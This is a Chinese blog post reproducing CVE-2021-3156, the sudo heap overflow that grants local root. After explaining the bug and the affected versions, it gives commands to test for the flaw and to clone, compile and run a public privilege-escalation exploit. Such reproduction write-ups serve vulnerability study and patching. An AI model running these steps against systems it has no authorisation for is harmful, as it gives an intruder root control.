# CVE-2021-3156 漏洞复现 附带 提权exp - 誉津 - 博客园

> 原文：[https://www.cnblogs.com/yujin2020/p/14377503.html](https://www.cnblogs.com/yujin2020/p/14377503.html)

# CVE-2021-3156 漏洞复现

**简介**

2021年1月26日，Linux安全工具sudo被发现严重的基于堆缓冲区溢出漏洞。利用这一漏洞，攻击者无需知道用户密码，一样可以获得root权限，并且是在默认配置下。此漏洞已分配为CVE-2021-3156，危险等级评分为7分。

当sudo通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时，实际上并未进行转义，从而可能导致缓冲区溢出。因此只要存在sudoers文件（通常是/etc/sudoers），攻击者就可以使用本地普通用户利用sudo获得系统root权限。研究人员利用该漏洞在多个Linux发行版上成功获得了完整的root权限，包括Ubuntu 20.04（sudo 1.8.31）、Debian 10（sudo 1.8.27）和Fedora 33（sudo 1.9.2），并且sudo支持的其他操作系统和Linux发行版也很容易受到攻击。

## 漏洞影响范围

**受影响版本**

*   Sudo 1.8.2 – 1.8.31p2
*   Sudo 1.9.0 – 1.9.5p1

**不受影响版本**

sudo =>1.9.5p2

## 漏洞复现

查看Linux及sudo版本

```
lsb_release -a
sudo -V 
```

![image-20210205140742856](../Images/d8db893673648b2322a47f77cdbb3ad8.png)

简单测试漏洞是否存在

```
sudoedit -s / 
```

如果返回以sudoedit:开头的错误，则当前系统可能存在安全风险；

不受影响的系统将显示以usage:开头的错误。

![image-20210209212649420](../Images/11b9974b3f46ffa9abc1d00f0ba5c13d.png)

下载exp

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 
```

![image-20210209212910019](../Images/705dd85ffc95c452acab4ff3f262704b.png)

编译exp

```
make 
```

![image-20210205140332301](../Images/ad2841b5b729a064c0ce584489fa266b.png)

添加执行权限

```
chmod a+x sudo-hax-me-a-sandwich 
```

![image-20210205140424433](../Images/37b27a461d7c09592bb082a88ef5f818.png)

exp提权测试

```
./sudo-hax-me-a-sandwich 0 
```

![image-20210205140523016](../Images/956dfa4d870a9f3d0d419259596c2101.png)

# 参考

[1] [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)